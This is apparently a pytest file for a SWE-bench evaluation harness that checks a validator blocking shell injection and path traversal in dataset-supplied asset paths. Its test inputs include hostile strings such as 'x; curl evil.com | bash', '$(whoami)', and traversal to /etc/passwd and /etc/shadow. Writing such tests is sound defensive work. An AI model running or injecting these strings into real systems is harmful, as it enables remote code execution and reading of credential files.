"""Asset paths must not inject shell commands or traverse the filesystem.

The image_assets field arrives from external sources (HuggingFace datasets,
task repos) and its ``path`` value is interpolated into shell commands that
run as root inside the eval container. Without sanitization, a crafted path
executes arbitrary commands (CWE-78) or escapes the asset directory (CWE-22).
"""

import pytest

from swebench.harness.run_evaluation import (
    _stage_image_assets,
    _validate_asset_path,
)


class TestValidateAssetPath:
    def test_normal_path(self):
        _validate_asset_path("tests/expected.png")

    def test_nested_path(self):
        _validate_asset_path("src/assets/baseline/image.png")

    def test_rejects_traversal(self):
        with pytest.raises(ValueError, match="contains '..'"):
            _validate_asset_path("../../../etc/passwd")

    def test_rejects_mid_traversal(self):
        with pytest.raises(ValueError, match="contains '..'"):
            _validate_asset_path("tests/../../etc/shadow")

    def test_rejects_absolute(self):
        with pytest.raises(ValueError, match="absolute"):
            _validate_asset_path("/etc/passwd")

    def test_rejects_semicolon(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x; curl evil.com | bash")

    def test_rejects_backtick(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x`id`")

    def test_rejects_dollar_paren(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x$(whoami)")

    def test_rejects_pipe(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x|cat /etc/passwd")

    def test_rejects_ampersand(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x&& curl evil.com")

    def test_rejects_newline(self):
        with pytest.raises(ValueError, match="disallowed"):
            _validate_asset_path("x\ncurl evil.com")
